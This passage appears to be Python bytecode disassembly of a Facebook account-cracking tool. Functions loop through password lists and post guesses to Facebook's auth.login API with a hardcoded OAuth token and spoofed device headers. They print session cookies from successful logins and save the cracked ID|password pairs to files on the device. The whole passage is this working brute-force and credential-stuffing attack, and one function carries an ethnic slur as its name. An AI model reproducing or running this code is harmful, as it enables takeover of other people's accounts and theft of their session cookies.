           1110 LOAD_METHOD              2 (write)
           1132 LOAD_FAST                0 (ids)
           1134 LOAD_CONST              42 ('|')
           1136 BINARY_OP                0 (+)
           1140 LOAD_FAST                2 (pas)
           1142 BINARY_OP                0 (+)
           1146 LOAD_CONST              37 ('\n')
           1148 BINARY_OP                0 (+)
           1152 PRECALL                  1
           1156 CALL                     1
           1166 POP_TOP

231        1168 LOAD_GLOBAL             36 (cps)
           1180 LOAD_METHOD             17 (append)
           1202 LOAD_GLOBAL             15 (NULL + str)
           1214 LOAD_FAST                9 (uid)
           1216 PRECALL                  1
           1220 CALL                     1
           1230 PRECALL                  1
           1234 CALL                     1
           1244 POP_TOP

232        1246 POP_TOP
           1248 JUMP_FORWARD             2 (to 1254)

234     >> 1250 EXTENDED_ARG             2
           1252 JUMP_BACKWARD          623 (to 8)

235     >> 1254 LOAD_GLOBAL              6 (loop)
           1266 LOAD_CONST              43 (1)
           1268 BINARY_OP               13 (+=)
           1272 STORE_GLOBAL             3 (loop)
           1274 LOAD_CONST               0 (None)
           1276 RETURN_VALUE
        >> 1278 PUSH_EXC_INFO

236        1280 POP_TOP

237        1282 POP_EXCEPT
           1284 LOAD_CONST               0 (None)
           1286 RETURN_VALUE
        >> 1288 COPY                     3
           1290 POP_EXCEPT
           1292 RERAISE                  1
ExceptionTable:
  4 to 504 -> 1278 [0]
  508 to 522 -> 526 [1]
  524 to 524 -> 1278 [0]
  526 to 532 -> 538 [2] lasti
  534 to 1272 -> 1278 [0]
  1278 to 1280 -> 1288 [1] lasti

Disassembly of <code object <genexpr> at 0x7ecf71402430, file " ", line 223>:
223           0 RETURN_GENERATOR
              2 POP_TOP
              4 RESUME                   0
              6 LOAD_FAST                0 (.0)
        >>    8 FOR_ITER                24 (to 58)
             10 STORE_FAST               1 (i)
             12 LOAD_FAST                1 (i)
             14 LOAD_CONST               0 ('name')
             16 BINARY_SUBSCR
             26 LOAD_CONST               1 ('=')
             28 BINARY_OP                0 (+)
             32 LOAD_FAST                1 (i)
             34 LOAD_CONST               2 ('value')
             36 BINARY_SUBSCR
             46 BINARY_OP                0 (+)
             50 YIELD_VALUE
             52 RESUME                   1
             54 POP_TOP
             56 JUMP_BACKWARD           25 (to 8)
        >>   58 LOAD_CONST               3 (None)
             60 RETURN_VALUE

Disassembly of <code object paki at 0x7ecf7104ec00, file " ", line 239>:
239           0 RESUME                   0

243           2 NOP

244           4 LOAD_FAST                1 (passlist)
              6 GET_ITER
        >>    8 EXTENDED_ARG             2
             10 FOR_ITER               603 (to 1218)
             12 STORE_FAST               2 (pas)

245          14 LOAD_GLOBAL              0 (sys)
             26 LOAD_ATTR                1 (stdout)
             36 LOAD_METHOD              2 (write)
             58 LOAD_CONST               1 ('\r\r \x1b[38;5;196m[\x1b[38;5;46mCRACKING-M3\x1b[38;5;196m] \x1b[38;5;46m')
             60 LOAD_GLOBAL              6 (loop)
             72 FORMAT_VALUE             1 (str)
             74 LOAD_CONST               2 (' \x1b[38;5;196m| \x1b[38;5;46mOK \x1b[38;5;196m:\x1b[38;5;46m')
             76 LOAD_GLOBAL              9 (NULL + len)
             88 LOAD_GLOBAL             10 (oks)
            100 PRECALL                  1
            104 CALL                     1
            114 FORMAT_VALUE             1 (str)
            116 BUILD_STRING             4
            118 PRECALL                  1
            122 CALL                     1
            132 POP_TOP

246         134 LOAD_GLOBAL              0 (sys)
            146 LOAD_ATTR                1 (stdout)
            156 LOAD_METHOD              6 (flush)
            178 PRECALL                  0
            182 CALL                     0
            192 POP_TOP

247         194 LOAD_GLOBAL             15 (NULL + str)
            206 LOAD_GLOBAL             17 (NULL + uuid)
            218 LOAD_ATTR                9 (uuid4)
            228 PRECALL                  0
            232 CALL                     0
            242 PRECALL                  1
            246 CALL                     1
            256 STORE_FAST               3 (adid)

248         258 LOAD_GLOBAL             15 (NULL + str)
            270 LOAD_GLOBAL             17 (NULL + uuid)
            282 LOAD_ATTR                9 (uuid4)
            292 PRECALL                  0
            296 CALL                     0
            306 PRECALL                  1
            310 CALL                     1
            320 STORE_FAST               4 (device_id)

249         322 LOAD_FAST                3 (adid)
            324 LOAD_CONST               3 ('json')
            326 LOAD_FAST                4 (device_id)
            328 LOAD_FAST                0 (ids)
            330 LOAD_FAST                2 (pas)
            332 LOAD_CONST               4 ('1')
            334 LOAD_CONST               5 ('password')
            336 LOAD_CONST               6 ('login')
            338 LOAD_CONST               7 ('button_with_disabled')
            340 LOAD_CONST               8 ('false')
            342 LOAD_CONST               4 ('1')
            344 LOAD_CONST               4 ('1')
            346 LOAD_CONST               9 ('')
            348 LOAD_CONST              10 ('0')
            350 LOAD_CONST              11 ('authenticate')
            352 LOAD_CONST              12 (('adid', 'format', 'device_id', 'email', 'password', 'generate_analytics_claims', 'credentials_type', 'source', 'error_detail_type', 'enroll_misauth', 'generate_session_cookies', 'generate_machine_id', 'meta_inf_fbmeta', 'currently_logged_in_userid', 'fb_api_req_friendly_name'))
            354 BUILD_CONST_KEY_MAP     15
            356 STORE_FAST               5 (datax)

250         358 LOAD_GLOBAL             21 (NULL + hasan03)
            370 PRECALL                  0
            374 CALL                     0
            384 LOAD_CONST              13 ('gzip, deflate')
            386 LOAD_CONST              14 ('*/*')
            388 LOAD_CONST              15 ('keep-alive')
            390 LOAD_CONST              16 ('OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32')
            392 LOAD_CONST              11 ('authenticate')
            394 LOAD_CONST              17 ('21435')
            396 LOAD_CONST              18 ('35793')
            398 LOAD_CONST              19 ('37855')
            400 LOAD_CONST              20 ('unknown')
            402 LOAD_CONST              21 ('application/x-www-form-urlencoded')
            404 LOAD_CONST              22 ('Liger')
            406 LOAD_CONST              23 (('User-Agent', 'Accept-Encoding', 'Accept', 'Connection', 'Authorization', 'X-FB-Friendly-Name', 'X-FB-Connection-Bandwidth', 'X-FB-Net-HNI', 'X-FB-SIM-HNI', 'X-FB-Connection-Type', 'Content-Type', 'X-FB-HTTP-Engine'))
            408 BUILD_CONST_KEY_MAP     12
            410 STORE_FAST               6 (header)

251         412 LOAD_CONST              24 ('https://api.facebook.com/method/auth.login')
            414 STORE_FAST               7 (url)

252         416 LOAD_GLOBAL             23 (NULL + requests)
            428 LOAD_ATTR               12 (post)
            438 LOAD_FAST                7 (url)
            440 LOAD_FAST                5 (datax)
            442 LOAD_FAST                6 (header)
            444 KW_NAMES                25
            446 PRECALL                  3
            450 CALL                     3
            460 LOAD_METHOD             13 (json)
            482 PRECALL                  0
            486 CALL                     0
            496 STORE_FAST               8 (reqx)

253         498 LOAD_CONST              26 ('session_key')
            500 LOAD_FAST                8 (reqx)
            502 CONTAINS_OP              0
            504 POP_JUMP_FORWARD_IF_FALSE   219 (to 944)

254         506 NOP

255         508 LOAD_FAST                8 (reqx)
            510 LOAD_CONST              27 ('uid')
            512 BINARY_SUBSCR
            522 STORE_FAST               9 (uid)
            524 JUMP_FORWARD             9 (to 544)
        >>  526 PUSH_EXC_INFO

256         528 POP_TOP

257         530 LOAD_FAST                0 (ids)
            532 STORE_FAST               9 (uid)
            534 POP_EXCEPT
            536 JUMP_FORWARD             3 (to 544)
        >>  538 COPY                     3
            540 POP_EXCEPT
            542 RERAISE                  1

258     >>  544 LOAD_GLOBAL             15 (NULL + str)
            556 LOAD_FAST                9 (uid)
            558 PRECALL                  1
            562 CALL                     1
            572 LOAD_GLOBAL             10 (oks)
            584 CONTAINS_OP              0
            586 POP_JUMP_FORWARD_IF_FALSE     3 (to 594)

259         588 POP_TOP
            590 EXTENDED_ARG             1
            592 JUMP_FORWARD           312 (to 1218)

261     >>  594 LOAD_GLOBAL             29 (NULL + print)
            606 LOAD_CONST              28 ('\r\r \x1b[38;5;46m[HASAN-OK] ')
            608 LOAD_GLOBAL             15 (NULL + str)
            620 LOAD_FAST                9 (uid)
            622 PRECALL                  1
            626 CALL                     1
            636 BINARY_OP                0 (+)
            640 LOAD_CONST              29 (' | ')
            642 BINARY_OP                0 (+)
            646 LOAD_FAST                2 (pas)
            648 BINARY_OP                0 (+)
            652 LOAD_CONST              30 ('\x1b[1;37m')
            654 BINARY_OP                0 (+)
            658 PRECALL                  1
            662 CALL                     1
            672 POP_TOP

262         674 LOAD_CONST              31 (';')
            676 LOAD_METHOD             15 (join)
            698 LOAD_CONST              32 (<code object <genexpr> at 0x7ecf71324830, file " ", line 262>)
            700 MAKE_FUNCTION            0
            702 LOAD_FAST                8 (reqx)
            704 LOAD_CONST              33 ('session_cookies')
            706 BINARY_SUBSCR
            716 GET_ITER
            718 PRECALL                  0
            722 CALL                     0
            732 PRECALL                  1
            736 CALL                     1
            746 STORE_FAST              10 (coki)

264         748 LOAD_GLOBAL             33 (NULL + open)
            760 LOAD_CONST              34 ('/sdcard/V2-M3-Ok.txt')
            762 LOAD_CONST              35 ('a')
            764 PRECALL                  2
            768 CALL                     2
            778 LOAD_METHOD              2 (write)
            800 LOAD_GLOBAL             15 (NULL + str)
            812 LOAD_FAST                9 (uid)
            814 PRECALL                  1
            818 CALL                     1
            828 LOAD_CONST              29 (' | ')
            830 BINARY_OP                0 (+)
            834 LOAD_FAST                2 (pas)
            836 BINARY_OP                0 (+)
            840 LOAD_CONST              36 ('\n')
            842 BINARY_OP                0 (+)
            846 PRECALL                  1
            850 CALL                     1
            860 POP_TOP

265         862 LOAD_GLOBAL             10 (oks)
            874 LOAD_METHOD             17 (append)
            896 LOAD_GLOBAL             15 (NULL + str)
            908 LOAD_FAST                9 (uid)
            910 PRECALL                  1
            914 CALL                     1
            924 PRECALL                  1
            928 CALL                     1
            938 POP_TOP

266         940 POP_TOP
            942 JUMP_FORWARD           137 (to 1218)

267     >>  944 LOAD_CONST              37 ('www.facebook.com')
            946 LOAD_FAST                8 (reqx)
            948 LOAD_CONST              38 ('error_msg')
            950 BINARY_SUBSCR
            960 CONTAINS_OP              0
            962 POP_JUMP_FORWARD_IF_FALSE   125 (to 1214)

268         964 LOAD_GLOBAL             29 (NULL + print)
            976 LOAD_CONST              39 ('\r\r \x1b[38;5;196m [SORRY-CP] ')
            978 LOAD_GLOBAL             15 (NULL + str)
            990 LOAD_FAST                9 (uid)
            992 PRECALL                  1
            996 CALL                     1
           1006 BINARY_OP                0 (+)
           1010 LOAD_CONST              29 (' | ')
           1012 BINARY_OP                0 (+)
           1016 LOAD_FAST                2 (pas)
           1018 BINARY_OP                0 (+)
           1022 LOAD_CONST              30 ('\x1b[1;37m')
           1024 BINARY_OP                0 (+)
           1028 PRECALL                  1
           1032 CALL                     1
           1042 POP_TOP

269        1044 LOAD_GLOBAL             33 (NULL + open)
           1056 LOAD_CONST              40 ('/sdcard/hasan-CP.txt')
           1058 LOAD_CONST              35 ('a')
           1060 PRECALL                  2
           1064 CALL                     2
           1074 LOAD_METHOD              2 (write)
           1096 LOAD_FAST                0 (ids)
           1098 LOAD_CONST              41 ('|')
           1100 BINARY_OP                0 (+)
           1104 LOAD_FAST                2 (pas)
           1106 BINARY_OP                0 (+)
           1110 LOAD_CONST              36 ('\n')
           1112 BINARY_OP                0 (+)
           1116 PRECALL                  1
           1120 CALL                     1
           1130 POP_TOP

270        1132 LOAD_GLOBAL             36 (cps)
           1144 LOAD_METHOD             17 (append)
           1166 LOAD_GLOBAL             15 (NULL + str)
           1178 LOAD_FAST                9 (uid)
           1180 PRECALL                  1
           1184 CALL                     1
           1194 PRECALL                  1
           1198 CALL                     1
           1208 POP_TOP

271        1210 POP_TOP
           1212 JUMP_FORWARD             2 (to 1218)

273     >> 1214 EXTENDED_ARG             2
           1216 JUMP_BACKWARD          605 (to 8)

274     >> 1218 LOAD_GLOBAL              6 (loop)
           1230 LOAD_CONST              42 (1)
           1232 BINARY_OP               13 (+=)
           1236 STORE_GLOBAL             3 (loop)
           1238 LOAD_CONST               0 (None)
           1240 RETURN_VALUE
        >> 1242 PUSH_EXC_INFO

275        1244 POP_TOP

276        1246 POP_EXCEPT
           1248 LOAD_CONST               0 (None)
           1250 RETURN_VALUE
        >> 1252 COPY                     3
           1254 POP_EXCEPT
           1256 RERAISE                  1
ExceptionTable:
  4 to 504 -> 1242 [0]
  508 to 522 -> 526 [1]
  524 to 524 -> 1242 [0]
  526 to 532 -> 538 [2] lasti
  534 to 1236 -> 1242 [0]
  1242 to 1244 -> 1252 [1] lasti

Disassembly of <code object <genexpr> at 0x7ecf71324830, file " ", line 262>:
262           0 RETURN_GENERATOR
              2 POP_TOP
              4 RESUME                   0
              6 LOAD_FAST                0 (.0)
        >>    8 FOR_ITER                24 (to 58)
             10 STORE_FAST               1 (i)
             12 LOAD_FAST                1 (i)
             14 LOAD_CONST               0 ('name')
             16 BINARY_SUBSCR
             26 LOAD_CONST               1 ('=')
             28 BINARY_OP                0 (+)
             32 LOAD_FAST                1 (i)
             34 LOAD_CONST               2 ('value')
             36 BINARY_SUBSCR
             46 BINARY_OP                0 (+)
             50 YIELD_VALUE
             52 RESUME                   1
             54 POP_TOP
             56 JUMP_BACKWARD           25 (to 8)
        >>   58 LOAD_CONST               3 (None)
             60 RETURN_VALUE

Disassembly of <code object nasir at 0x7ecf7104f800, file " ", line 278>:
278           0 RESUME                   0

282           2 NOP

283           4 LOAD_FAST                1 (passlist)
              6 GET_ITER
        >>    8 EXTENDED_ARG             2
             10 FOR_ITER               621 (to 1254)
             12 STORE_FAST               2 (pas)

284          14 LOAD_GLOBAL              0 (sys)
             26 LOAD_ATTR                1 (stdout)
             36 LOAD_METHOD              2 (write)
             58 LOAD_CONST               1 ('\r\r \x1b[38;5;196m[\x1b[38;5;46mCRACKING-M4\x1b[38;5;196m] \x1b[38;5;46m')
             60 LOAD_GLOBAL              6 (loop)
             72 FORMAT_VALUE             1 (str)
             74 LOAD_CONST               2 (' \x1b[38;5;196m| \x1b[38;5;46mOK \x1b[38;5;196m:\x1b[38;5;46m')
             76 LOAD_GLOBAL              9 (NULL + len)
             88 LOAD_GLOBAL             10 (oks)
            100 PRECALL                  1
            104 CALL                     1
            114 FORMAT_VALUE             1 (str)
            116 BUILD_STRING             4
            118 PRECALL                  1
            122 CALL                     1
            132 POP_TOP

285         134 LOAD_GLOBAL              0 (sys)
            146 LOAD_ATTR                1 (stdout)
            156 LOAD_METHOD              6 (flush)
            178 PRECALL                  0
            182 CALL                     0
            192 POP_TOP

286         194 LOAD_GLOBAL             15 (NULL + str)
            206 LOAD_GLOBAL             17 (NULL + uuid)
            218 LOAD_ATTR                9 (uuid4)
            228 PRECALL                  0
            232 CALL                     0
            242 PRECALL                  1
            246 CALL                     1
            256 STORE_FAST               3 (adid)

287         258 LOAD_GLOBAL             15 (NULL + str)
            270 LOAD_GLOBAL             17 (NULL + uuid)
            282 LOAD_ATTR                9 (uuid4)
            292 PRECALL                  0
            296 CALL                     0
            306 PRECALL                  1
            310 CALL                     1
            320 STORE_FAST               4 (device_id)

288         322 LOAD_FAST                3 (adid)
            324 LOAD_CONST               3 ('json')
            326 LOAD_FAST                4 (device_id)
            328 LOAD_FAST                0 (ids)
            330 LOAD_FAST                2 (pas)
            332 LOAD_CONST               4 ('1')
            334 LOAD_CONST               5 ('password')
            336 LOAD_CONST               6 ('login')
            338 LOAD_CONST               7 ('button_with_disabled')
            340 LOAD_CONST               8 ('false')
            342 LOAD_CONST               4 ('1')
            344 LOAD_CONST               4 ('1')
            346 LOAD_CONST               9 ('')
            348 LOAD_CONST              10 ('0')
            350 LOAD_CONST              11 ('authenticate')
            352 LOAD_CONST              12 (('adid', 'format', 'device_id', 'email', 'password', 'generate_analytics_claims', 'credentials_type', 'source', 'error_detail_type', 'enroll_misauth', 'generate_session_cookies', 'generate_machine_id', 'meta_inf_fbmeta', 'currently_logged_in_userid', 'fb_api_req_friendly_name'))
            354 BUILD_CONST_KEY_MAP     15
            356 STORE_FAST               5 (datax)

289         358 LOAD_GLOBAL             21 (NULL + hasan03)
            370 PRECALL                  0
            374 CALL                     0
            384 LOAD_CONST              13 ('gzip, deflate')
            386 LOAD_CONST              14 ('*/*')
            388 LOAD_CONST              15 ('keep-alive')
            390 LOAD_CONST              16 ('OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32')
            392 LOAD_CONST              11 ('authenticate')
            394 LOAD_CONST              17 ('21435')
            396 LOAD_CONST              18 ('35793')
            398 LOAD_CONST              19 ('37855')
            400 LOAD_CONST              20 ('unknown')
            402 LOAD_CONST              21 ('application/x-www-form-urlencoded')
            404 LOAD_CONST              22 ('Liger')
            406 LOAD_CONST              23 (('User-Agent', 'Accept-Encoding', 'Accept', 'Connection', 'Authorization', 'X-FB-Friendly-Name', 'X-FB-Connection-Bandwidth', 'X-FB-Net-HNI', 'X-FB-SIM-HNI', 'X-FB-Connection-Type', 'Content-Type', 'X-FB-HTTP-Engine'))
            408 BUILD_CONST_KEY_MAP     12
            410 STORE_FAST               6 (header)

290         412 LOAD_CONST              24 ('https://api.facebook.com/method/auth.login')
            414 STORE_FAST               7 (url)

291         416 LOAD_GLOBAL             23 (NULL + requests)
            428 LOAD_ATTR               12 (post)
            438 LOAD_FAST                7 (url)
            440 LOAD_FAST                5 (datax)
            442 LOAD_FAST                6 (header)
            444 KW_NAMES                25
            446 PRECALL                  3
            450 CALL                     3
            460 LOAD_METHOD             13 (json)
            482 PRECALL                  0
            486 CALL                     0
            496 STORE_FAST               8 (reqx)

292         498 LOAD_CONST              26 ('session_key')
            500 LOAD_FAST                8 (reqx)
            502 CONTAINS_OP              0
            504 POP_JUMP_FORWARD_IF_FALSE   237 (to 980)

293         506 NOP

294         508 LOAD_FAST                8 (reqx)
            510 LOAD_CONST              27 ('uid')
            512 BINARY_SUBSCR
            522 STORE_FAST               9 (uid)
            524 JUMP_FORWARD             9 (to 544)
        >>  526 PUSH_EXC_INFO

295         528 POP_TOP

296         530 LOAD_FAST                0 (ids)
            532 STORE_FAST               9 (uid)
            534 POP_EXCEPT
            536 JUMP_FORWARD             3 (to 544)
        >>  538 COPY                     3
            540 POP_EXCEPT
            542 RERAISE                  1

297     >>  544 LOAD_GLOBAL             15 (NULL + str)
            556 LOAD_FAST                9 (uid)
            558 PRECALL                  1
            562 CALL                     1
            572 LOAD_GLOBAL             10 (oks)
            584 CONTAINS_OP              0
            586 POP_JUMP_FORWARD_IF_FALSE     3 (to 594)

298         588 POP_TOP
            590 EXTENDED_ARG             1
            592 JUMP_FORWARD           330 (to 1254)

300     >>  594 LOAD_GLOBAL             29 (NULL + print)
            606 LOAD_CONST              28 ('\r\r \x1b[38;5;46m[HASAN-OK] ')
            608 LOAD_GLOBAL             15 (NULL + str)
            620 LOAD_FAST                9 (uid)
            622 PRECALL                  1
            626 CALL                     1
            636 BINARY_OP                0 (+)
            640 LOAD_CONST              29 (' | ')
            642 BINARY_OP                0 (+)
            646 LOAD_FAST                2 (pas)
            648 BINARY_OP                0 (+)
            652 LOAD_CONST              30 ('\x1b[1;37m')
            654 BINARY_OP                0 (+)
            658 PRECALL                  1
            662 CALL                     1
            672 POP_TOP

301         674 LOAD_CONST              31 (';')
            676 LOAD_METHOD             15 (join)
            698 LOAD_CONST              32 (<code object <genexpr> at 0x7ecf71324930, file " ", line 301>)
            700 MAKE_FUNCTION            0
            702 LOAD_FAST                8 (reqx)
            704 LOAD_CONST              33 ('session_cookies')
            706 BINARY_SUBSCR
            716 GET_ITER
            718 PRECALL                  0
            722 CALL                     0
            732 PRECALL                  1
            736 CALL                     1
            746 STORE_FAST              10 (coki)

302         748 LOAD_GLOBAL             29 (NULL + print)
            760 LOAD_CONST              34 ('\x1b[38;5;196m [=]-\x1b[38;5;192m[COOKIES] ')
            762 LOAD_FAST               10 (coki)
            764 BINARY_OP                0 (+)
            768 PRECALL                  1
            772 CALL                     1
            782 POP_TOP

303         784 LOAD_GLOBAL             33 (NULL + open)
            796 LOAD_CONST              35 ('/sdcard/V2-M4-Ok.txt')
            798 LOAD_CONST              36 ('a')
            800 PRECALL                  2
            804 CALL                     2
            814 LOAD_METHOD              2 (write)
            836 LOAD_GLOBAL             15 (NULL + str)
            848 LOAD_FAST                9 (uid)
            850 PRECALL                  1
            854 CALL                     1
            864 LOAD_CONST              29 (' | ')
            866 BINARY_OP                0 (+)
            870 LOAD_FAST                2 (pas)
            872 BINARY_OP                0 (+)
            876 LOAD_CONST              37 ('\n')
            878 BINARY_OP                0 (+)
            882 PRECALL                  1
            886 CALL                     1
            896 POP_TOP

304         898 LOAD_GLOBAL             10 (oks)
            910 LOAD_METHOD             17 (append)
            932 LOAD_GLOBAL             15 (NULL + str)
            944 LOAD_FAST                9 (uid)
            946 PRECALL                  1
            950 CALL                     1
            960 PRECALL                  1
            964 CALL                     1
            974 POP_TOP

305         976 POP_TOP
            978 JUMP_FORWARD           137 (to 1254)

306     >>  980 LOAD_CONST              38 ('www.facebook.com')
            982 LOAD_FAST                8 (reqx)
            984 LOAD_CONST              39 ('error_msg')
            986 BINARY_SUBSCR
            996 CONTAINS_OP              0
            998 POP_JUMP_FORWARD_IF_FALSE   125 (to 1250)

307        1000 LOAD_GLOBAL             29 (NULL + print)
           1012 LOAD_CONST              40 ('\r\r \x1b[38;5;196m [SORRY-CP] ')
           1014 LOAD_GLOBAL             15 (NULL + str)
           1026 LOAD_FAST                9 (uid)
           1028 PRECALL                  1
           1032 CALL                     1
           1042 BINARY_OP                0 (+)
           1046 LOAD_CONST              29 (' | ')
           1048 BINARY_OP                0 (+)
           1052 LOAD_FAST                2 (pas)
           1054 BINARY_OP                0 (+)
           1058 LOAD_CONST              30 ('\x1b[1;37m')
           1060 BINARY_OP                0 (+)
           1064 PRECALL                  1
           1068 CALL                     1
           1078 POP_TOP

308        1080 LOAD_GLOBAL             33 (NULL + open)
           1092 LOAD_CONST              41 ('/sdcard/hasan-CP.txt')
           1094 LOAD_CONST              36 ('a')
           1096 PRECALL                  2
           1100 CALL                     2
           1110 LOAD_METHOD              2 (write)
           1132 LOAD_FAST                0 (ids)
           1134 LOAD_CONST              42 ('|')
           1136 BINARY_OP                0 (+)
           1140 LOAD_FAST                2 (pas)
           1142 BINARY_OP                0 (+)
           1146 LOAD_CONST              37 ('\n')
           1148 BINARY_OP                0 (+)
           1152 PRECALL                  1
           1156 CALL                     1
           1166 POP_TOP

309        1168 LOAD_GLOBAL             36 (cps)
           1180 LOAD_METHOD             17 (append)
           1202 LOAD_GLOBAL             15 (NULL + str)
           1214 LOAD_FAST                9 (uid)
           1216 PRECALL                  1
           1220 CALL                     1
           1230 PRECALL                  1
           1234 CALL                     1
           1244 POP_TOP

310        1246 POP_TOP
           1248 JUMP_FORWARD             2 (to 1254)

312     >> 1250 EXTENDED_ARG             2
           1252 JUMP_BACKWARD          623 (to 8)

313     >> 1254 LOAD_GLOBAL              6 (loop)
           1266 LOAD_CONST              43 (1)
           1268 BINARY_OP               13 (+=)
           1272 STORE_GLOBAL             3 (loop)
           1274 LOAD_CONST               0 (None)
           1276 RETURN_VALUE
        >> 1278 PUSH_EXC_INFO

314        1280 POP_TOP

315        1282 POP_EXCEPT
           1284 LOAD_CONST               0 (None)
           1286 RETURN_VALUE
        >> 1288 COPY                     3
           1290 POP_EXCEPT
           1292 RERAISE                  1
ExceptionTable:
  4 to 504 -> 1278 [0]
  508 to 522 -> 526 [1]
  524 to 524 -> 1278 [0]
  526 to 532 -> 538 [2] lasti
  534 to 1272 -> 1278 [0]
  1278 to 1280 -> 1288 [1] lasti

Disassembly of <code object <genexpr> at 0x7ecf71324930, file " ", line 301>:
301           0 RETURN_GENERATOR
              2 POP_TOP
              4 RESUME                   0
              6 LOAD_FAST                0 (.0)
        >>    8 FOR_ITER                24 (to 58)
             10 STORE_FAST               1 (i)
             12 LOAD_FAST                1 (i)
             14 LOAD_CONST               0 ('name')
             16 BINARY_SUBSCR
             26 LOAD_CONST               1 ('=')
             28 BINARY_OP                0 (+)
             32 LOAD_FAST                1 (i)
             34 LOAD_CONST               2 ('value')
             36 BINARY_SUBSCR
             46 BINARY_OP                0 (+)
             50 YIELD_VALUE
             52 RESUME                   1
             54 POP_TOP
             56 JUMP_BACKWARD           25 (to 8)
        >>   58 LOAD_CONST               3 (None)
             60 RETURN_VALUE
